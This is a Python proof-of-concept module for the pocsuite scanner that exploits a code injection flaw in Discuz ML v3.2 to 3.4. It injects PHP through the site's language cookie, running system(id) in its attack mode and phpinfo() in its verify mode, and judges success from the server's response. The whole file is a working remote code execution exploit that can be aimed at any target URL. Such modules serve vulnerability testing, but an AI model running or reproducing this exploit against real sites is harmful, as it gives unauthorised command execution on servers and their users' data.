#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

def get_url(url, cookie):
    try:
        httpreq = req.Session()
        headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie" : cookie
        }
        resp = httpreq.get(url, headers=headers)
    except Exception as ex:
        resp = None
    return resp

class TestPOC(POCBase):
    name = 'discuz3.X Remote Code Execution Vulnerability'
    vulID = '0'
    author = ['cws6']
    vulType = 'code-exec'
    version = '1'
    references = ['http://esoln.net/esoln/blog/2019/06/14/discuzml-v-3-x-code-injection-vulnerability/?tdsourcetag=s_pctim_aiomsg']
    desc = '''discuz3.X外部参数`$lng`可控，导致`template` 函数生成的临时模板文件名可操纵，插入自己的代码，最终include_once包含一下最终导致了代码注入'''

    vulDate = '2019-06-14'
    createDate = '2019-07-11'
    updateDate = '2019-07-11'

    appName = 'discuz'
    appVersion = 'ML v.3.2~ML v.3.4'
    appPowerLink = 'http://discuz.ml/download'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        result = {}
        payload1 = '/portal.php'
        resp = req.get(self.url + payload1)
        cookie1 = re.findall("cookiepre = '(.*?)'", resp.content)
        cookie = str(cookie1[0]) + "language=sc'.system(id).';"
        resp1 = get_url(self.url + payload1,cookie)
        time.sleep(1)
        if 'uid' in resp1.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def _verify(self):
        """verify mode"""
        result = {}
        payload1 = '/portal.php'
        resp = req.get(self.url + payload1)
        cookie1 = re.findall("cookiepre = '(.*?)'", resp.content)
        cookie = str(cookie1[0]) + "language=sc'.phpinfo().';"
        resp1 = get_url(self.url + payload1,cookie)
        time.sleep(1)
        if 'phpinfo' in resp1.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)
